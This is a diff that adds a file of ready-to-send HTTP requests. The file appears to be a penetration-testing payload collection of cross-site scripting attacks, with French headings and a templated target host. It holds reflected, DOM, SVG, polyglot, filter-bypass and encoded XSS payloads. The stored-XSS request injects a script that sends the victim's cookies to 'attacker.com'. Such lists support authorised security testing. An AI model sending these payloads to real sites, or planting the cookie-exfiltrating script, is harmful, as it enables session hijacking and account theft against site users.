@@ -1,0 +1,46 @@
+# XSS (Cross-Site Scripting) - Bonus attacks
+# Complément aux injections
+
+### Reflected XSS - Basic
+GET /search?q=<script>alert(1)</script> HTTP/1.1
+Host: {{host}}
+
+### Reflected XSS - Event Handler
+GET /search?q=<img src=x onerror=alert(1)> HTTP/1.1
+Host: {{host}}
+
+### Reflected XSS - JavaScript Protocol
+GET /search?q=<a href="javascript:alert(1)">Click</a> HTTP/1.1
+Host: {{host}}
+
+### Stored XSS - Comment
+POST /api/comments HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 80
+
+{"comment": "<script>fetch('http://attacker.com?c='+document.cookie)</script>"}
+
+### DOM XSS - Hash Fragment
+GET /#<img src=x onerror=alert(1)> HTTP/1.1
+Host: {{host}}
+
+### XSS - SVG
+GET /search?q=<svg/onload=alert(1)> HTTP/1.1
+Host: {{host}}
+
+### XSS - Polyglot
+GET /search?q=jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e HTTP/1.1
+Host: {{host}}
+
+### XSS - Filter Bypass
+GET /search?q=<scr<script>ipt>alert(1)</scr</script>ipt> HTTP/1.1
+Host: {{host}}
+
+### XSS - Encoded
+GET /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1
+Host: {{host}}
+
+### XSS - Double Encoded
+GET /search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E HTTP/1.1
+Host: {{host}}
